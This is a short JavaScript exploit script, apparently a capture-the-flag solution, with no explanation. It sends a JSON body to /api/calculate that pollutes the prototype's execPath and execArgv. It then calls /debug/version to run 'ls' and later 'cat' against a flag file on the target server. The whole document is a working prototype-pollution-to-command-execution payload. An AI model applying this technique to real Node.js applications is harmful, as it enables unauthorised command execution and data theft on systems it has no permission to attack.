fetch("/api/calculate", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
    'constructor': {'prototype': {
        'execPath':'ls', 'execArgv':['./']
        }
    }
  }),
}).then((x) => console.log(x));

setTimeout(() => {fetch("/debug/version").then((x) => x.text()).then((x) => console.log(x))},2000);

setTimeout(() => {fetch("/api/calculate", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
    'constructor': {'prototype': {
        'execPath':'cat', 'execArgv':['flag_e1T6f']
        }
    }
  }),
}).then((x) => console.log(x))},4000)

setTimeout(() => {fetch("/debug/version").then((x) => x.text()).then((x) => console.log(x))},6000);
